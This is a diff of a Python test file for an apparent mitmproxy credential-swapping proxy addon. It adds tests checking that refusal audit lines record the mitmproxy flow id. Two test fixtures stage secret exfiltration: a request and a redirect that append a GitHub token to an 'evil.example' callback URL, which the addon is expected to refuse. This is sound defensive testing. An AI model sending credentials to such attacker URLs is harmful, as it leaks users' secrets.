@@ -232,8 +232,8 @@ def make_addon(secrets=SECRETS, hosts=HOSTS, registry=REGISTRY,
     a._expiry_cache = {}  # S2 (#511): expiry-lookup cache, same shape
     a._pending_cache = {}  # #563: per-tuple pending/ scan cache
     a.refused = []
-    a._audit_refused = lambda host, name, reason: a.refused.append(
-        (host, name, reason))
+    a._audit_refused = lambda host, name, reason, flow_id=None: \
+        a.refused.append((host, name, reason))
     a.audit_notes = []
     a._audit_note = lambda host, refused, reason, flow_id=None: \
         a.audit_notes.append((host, refused, reason))
@@ -1556,8 +1556,10 @@ class JsonSwapValidityTests(unittest.TestCase):
             (host, matched)) or True
         real_resolve = a._resolve
 
-        def resolve_with_aid(name, entry, host, method, path, location):
-            v, _ = real_resolve(name, entry, host, method, path, location)
+        def resolve_with_aid(name, entry, host, method, path, location,
+                             flow_id=None):
+            v, _ = real_resolve(name, entry, host, method, path, location,
+                                flow_id=flow_id)
             return v, ("grantaid1" if v is not None else None)
 
         a._resolve = resolve_with_aid
@@ -1585,8 +1587,10 @@ class JsonSwapValidityTests(unittest.TestCase):
             (host, matched)) or True
         real_resolve = a._resolve
 
-        def resolve_with_aid(name, entry, host, method, path, location):
-            v, _ = real_resolve(name, entry, host, method, path, location)
+        def resolve_with_aid(name, entry, host, method, path, location,
+                             flow_id=None):
+            v, _ = real_resolve(name, entry, host, method, path, location,
+                                flow_id=flow_id)
             return v, ("grantaid1" if v is not None else None)
 
         a._resolve = resolve_with_aid
@@ -1616,8 +1620,10 @@ class JsonSwapValidityTests(unittest.TestCase):
         real_resolve = a._resolve
         calls = []
 
-        def resolve_rotating(name, entry, host, method, path, location):
-            v, _ = real_resolve(name, entry, host, method, path, location)
+        def resolve_rotating(name, entry, host, method, path, location,
+                             flow_id=None):
+            v, _ = real_resolve(name, entry, host, method, path, location,
+                                flow_id=flow_id)
             calls.append(name)
             if v is None:
                 return None, None
@@ -1968,7 +1974,7 @@ class AuthorityAndPlacementTests(unittest.TestCase):
         flow.server_conn = conn
         a.mismatch = []
         a._audit_authority_mismatch = \
-            lambda h, auth, ip: a.mismatch.append((h, auth, ip))
+            lambda h, auth, ip, flow_id=None: a.mismatch.append((h, auth, ip))
         return a, flow
 
     def test_authority_mismatch_refuses_swaps(self):
@@ -2682,6 +2688,135 @@ class Issue16FlowCorrelatorTests(unittest.TestCase):
         self.assertTrue(all(l.endswith("flow=-") for l in lines), lines)
         self.assertTrue(any("swapped=" in l for l in lines), lines)
         self.assertTrue(any("refused=egress" in l for l in lines), lines)
+
+
+class Issue1441RefusalFlowIdTests(unittest.TestCase):
+    """Issue #1441: every refusal audit line carries the mitmproxy flow
+    id, so an operator can join any refusal to the flow's `swapped=`
+    lines. The #16 fix covered the swap paths and the `server_connect`
+    egress verdict; this extends the join to the request-time, JSON-body,
+    websocket, and response-side refusal lines (each fires in a hook
+    where the flow is in scope). The tests exercise the real writers —
+    the `flow=` field lives in the writers — against a tmp LOG_FILE.
+    """
+
+    def _real_note_addon(self, **kw):
+        a = make_addon(**kw)
+        # Exercise the real refusal writers; the other writers keep
+        # their test stubs (#16's ground, unchanged).
+        del a._audit_note
+        del a._audit_refused
+        return a
+
+    def _lines(self, tmp, drive, **kw):
+        a = self._real_note_addon(**kw)
+        with mock.patch.object(sa, "LOG_FILE", Path(tmp) / "swap.log"):
+            drive(a)
+        return (Path(tmp) / "swap.log").read_text().splitlines()
+
+    def test_json_swap_abort_carries_flow_id(self):
+        """The #838 invalid-JSON body abort is audited with the flow id."""
+        with tempfile.TemporaryDirectory() as tmp:
+            def drive(a):
+                req = Request("api.github.com", "/cfg",
+                              [("Content-Type", "application/json")],
+                              b'{"port": hsurr:github}')
+                flow = Flow(req)
+                flow.id = "jsonflow1"
+                a.request(flow)
+            lines = self._lines(tmp, drive)
+        notes = [l for l in lines if "json-swap" in l]
+        self.assertEqual(len(notes), 1, lines)
+        self.assertIn("invalid-json-after-swap", notes[0])
+        self.assertIn("flow=jsonflow1", notes[0])
+
+    def test_request_secret_refused_carries_flow_id(self):
+        """The #855 real-value request refusal carries the flow id."""
+        with tempfile.TemporaryDirectory() as tmp:
+            def drive(a):
+                req = Request("evil.example",
+                              "/cb?token=" + SECRETS["github"])
+                flow = Flow(req)
+                flow.id = "reqflow2"
+                a.request(flow)
+            lines = self._lines(tmp, drive)
+        notes = [l for l in lines if "request-secret-refused" in l]
+        self.assertEqual(len(notes), 1, lines)
+        self.assertIn("flow=reqflow2", notes[0])
+
+    def test_websocket_over_swap_cap_carries_flow_id(self):
+        """The websocket over-cap pass-through note carries the flow id."""
+        with tempfile.TemporaryDirectory() as tmp:
+            def drive(a):
+                big = b"hsurr:github" + b"x" * (sa._MAX_SWAP_BODY_BYTES + 1)
+                flow = Flow(Request("api.github.com", "/ws"))
+                flow.id = "wsflow3"
+                flow.websocket = FakeWebSocket([FakeWSMessage(big)])
+                a.websocket_message(flow)
+            lines = self._lines(tmp, drive, stream_hosts=["api.github.com"])
+        notes = [l for l in lines if "websocket-message" in l]
+        self.assertEqual(len(notes), 1, lines)
+        self.assertIn("over-swap-cap", notes[0])
+        self.assertIn("flow=wsflow3", notes[0])
+
+    def test_redirect_secret_refused_carries_flow_id(self):
+        """The #94 redirect refusal in `responseheaders` carries the
+        flow id."""
+        with tempfile.TemporaryDirectory() as tmp:
+            def drive(a):
+                resp = FakeResponse(b"", "text/html", status_code=302)
+                resp.headers.set_all(
+                    "location",
+                    ["https://evil.example/cb?token=" + SECRETS["github"]])
+                flow = Flow(Request("github.com", "/login"))
+                flow.id = "respflow4"
+                flow.response = resp
+                a.responseheaders(flow)
+            lines = self._lines(tmp, drive)
+        notes = [l for l in lines if "redirect-secret-refused" in l]
+        self.assertEqual(len(notes), 1, lines)
+        self.assertIn("flow=respflow4", notes[0])
+
+    def test_authority_mismatch_writer_carries_flow_id(self):
+        """The authority-mismatch writer renders `flow=` like the rest."""
+        with tempfile.TemporaryDirectory() as tmp:
+            def drive(a):
+                a._audit_authority_mismatch("api.github.com", "x",
+                                           "1.2.3.4", flow_id="authflow5")
+            lines = self._lines(tmp, drive)
+        self.assertEqual(len(lines), 1, lines)
+        self.assertIn("refused=authority-mismatch", lines[0])
+        self.assertIn("flow=authflow5", lines[0])
+
+    def test_refused_placeholder_writer_carries_flow_id(self):
+        """The finding-22 `_audit_refused` writer renders `flow=` like
+        the other refusal writers."""
+        with tempfile.TemporaryDirectory() as tmp:
+            def drive(a):
+                a._audit_refused("api.github.com", "github",
+                                 "unknown-credential", flow_id="refused6")
+            lines = self._lines(tmp, drive)
+        self.assertEqual(len(lines), 1, lines)
+        self.assertIn("refused=hsurr:github", lines[0])
+        self.assertIn("flow=refused6", lines[0])
+
+    def test_resolve_unknown_credential_refusal_carries_flow_id(self):
+        """The `_resolve` unknown-credential refusal — the live
+        hook-time path through the binding verdict — carries the flow
+        id (the `_audit_refused` threading one level down)."""
+        with tempfile.TemporaryDirectory() as tmp:
+            def drive(a):
+                req = Request("api.github.com", "/x",
+                              [("X-Test", "hsurr:nosuchcred")])
+                flow = Flow(req)
+                flow.id = "resolveflow7"
+                a.request(flow)
+            lines = self._lines(tmp, drive)
+        notes = [l for l in lines
+                 if "refused=hsurr:nosuchcred" in l]
+        self.assertEqual(len(notes), 1, lines)
+        self.assertIn("unknown-credential", notes[0])
+        self.assertIn("flow=resolveflow7", notes[0])
 
 
 class StreamRefusalTests(unittest.TestCase):
